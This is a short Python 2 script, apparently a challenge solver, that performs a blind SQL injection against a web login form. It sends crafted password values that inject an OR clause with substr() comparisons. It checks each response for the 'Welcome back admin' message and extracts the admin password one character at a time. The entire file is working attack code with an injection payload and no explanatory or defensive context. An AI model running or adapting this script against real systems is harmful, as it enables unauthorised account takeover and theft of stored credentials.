#!/usr/bin/python
import httplib, urllib

url=""
user="admin"
host=""
cookie="PHPSESSID=fdrsl9gs8edi38n4;"

challengeOk="Welcome back admin"
challengeKo="Error : no such user/password"



conn = httplib.HTTPConnection(host)
headers = {"Cookie" : cookie,'Content-Type':'application/x-www-form-urlencoded' }


charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
ok=True
found=''
i=0
while ok:
    ok=False
    i=i+1
    for letter in charset:
        sql="' OR (username='admin' AND substr(password,0,%i)='%s%s') AND ''='" % (i,found,letter)
#        print sql
        params = urllib.urlencode({'username':'admin', 'password':sql})
        conn.request("POST","%s" %(url), params, headers)
        response = conn.getresponse()
        data = response.read()
        if data.find(challengeOk)!=-1:
            print letter
            found=found+letter
            ok=True
            break
        
conn.close()
print "Password:"+found

